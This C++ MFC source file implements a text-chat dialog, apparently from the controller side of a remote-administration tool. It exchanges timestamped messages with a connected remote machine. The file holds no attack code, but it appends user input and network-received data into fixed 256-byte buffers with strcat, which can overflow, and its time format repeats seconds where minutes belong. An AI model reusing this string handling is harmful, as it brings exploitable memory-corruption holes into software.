// TextChatDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "TextChatDlg.h"
#include "InputDlg.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CTextChatDlg dialog


CTextChatDlg::CTextChatDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CTextChatDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CTextChatDlg)
	//}}AFX_DATA_INIT

	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	
	m_bIsOfflineRecord = (BYTE)m_pContext->m_DeCompressionBuffer.GetBuffer(0)[1];

	m_hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_ICON_TEXTCHAT), IMAGE_ICON, 20, 20, 0);

}


void CTextChatDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CTextChatDlg)
	DDX_Control(pDX, IDC_EDIT_NEWTEXT, m_edit_new_text);
	DDX_Control(pDX, IDC_EDIT_CHAT, m_edit_chat);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CTextChatDlg, CDialog)
	//{{AFX_MSG_MAP(CTextChatDlg)
	ON_WM_SIZE()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CTextChatDlg message handlers

void CTextChatDlg::OnOK() 
{
	// TODO: Add extra validation here
	m_edit_new_text.SetFocus();

	char str[250] = {0};
	GetDlgItemText(IDC_EDIT_NEWTEXT,str,sizeof(str));
	if (strcmp(str,"")==0)
	{
		return;
	}

	char Text[256] = {0};	
	CString strTime;
	CTime tm;
	tm=CTime::GetCurrentTime();
	strTime=tm.Format("<<== 发送消息(SendOut): (%Y-%m-%d %H:%S:%S)\r\n");

	strcat(Text,strTime.GetBuffer(0));
	strcat(Text,str);
	strcat(Text,"\r\n\r\n");

 
	m_iocpServer->Send(m_pContext, (LPBYTE)str,lstrlen(str));
	m_edit_chat.ReplaceSel(Text);
	SetDlgItemText(IDC_EDIT_NEWTEXT,"");

	return;
	CDialog::OnOK();
}

void CTextChatDlg::OnCancel() 
{
	// TODO: Add extra cleanup here
	MessageBox("文字聊天结束完成");
	closesocket(m_pContext->m_Socket);
	CDialog::OnCancel();
}

BOOL CTextChatDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	// TODO: Add extra initialization here
	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - 文字聊天", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);

	m_edit_chat.SetLimitText(MAXDWORD); // 设置最大长度

	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CTextChatDlg::OnReceiveComplete()
{	
	m_pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
	CString strResult = m_pContext->m_DeCompressionBuffer.GetBuffer(0);
	char Text[256] = {0};

	CString strTime;
	CTime tm;
	tm=CTime::GetCurrentTime();
	strTime=tm.Format("==>> 接收消息(Receive): (%Y-%m-%d %H:%S:%S)\r\n");


	strcat(Text,strTime.GetBuffer(0));
	strcat(Text,strResult);
	strcat(Text,"\r\n\r\n");
 
	m_edit_chat.ReplaceSel(Text);
}

BOOL CTextChatDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->wParam == VK_ESCAPE)
	{
		return true;
	}	
	return CDialog::PreTranslateMessage(pMsg);
}

void CTextChatDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	if(!IsWindowVisible()) return;

	RECT    rectClient;
	RECT	rectEditchat;
	RECT    rectEditNewText;
	RECT    rectButtonOk;
	RECT    rectButtonClose;

	GetClientRect(&rectClient);

	rectEditchat.left = 0;
	rectEditchat.top = 19;
	rectEditchat.right = rectClient.right;
	rectEditchat.bottom = rectClient.bottom - 120;

	rectEditNewText.left = 0;
	rectEditNewText.top = rectClient.bottom - 110;
	rectEditNewText.right = rectClient.right ;
	rectEditNewText.bottom = rectClient.bottom - 30;

	rectButtonOk.left = rectClient.right - 90;
	rectButtonOk.top = rectClient.bottom - 25;
    rectButtonOk.bottom = rectClient.bottom - 3;
	rectButtonOk.right = rectClient.right -10;

	rectButtonClose.left = rectClient.right - 180;
	rectButtonClose.top = rectClient.bottom - 25;
    rectButtonClose.bottom = rectClient.bottom - 3;
	rectButtonClose.right = rectClient.right -95;
	
	m_edit_chat.MoveWindow(&rectEditchat);
	m_edit_new_text.MoveWindow(&rectEditNewText);
	GetDlgItem(IDOK)->MoveWindow(&rectButtonOk);
	GetDlgItem(IDCANCEL)->MoveWindow(&rectButtonClose);

}

void CTextChatDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	delete this;
	CDialog::PostNcDestroy();
}
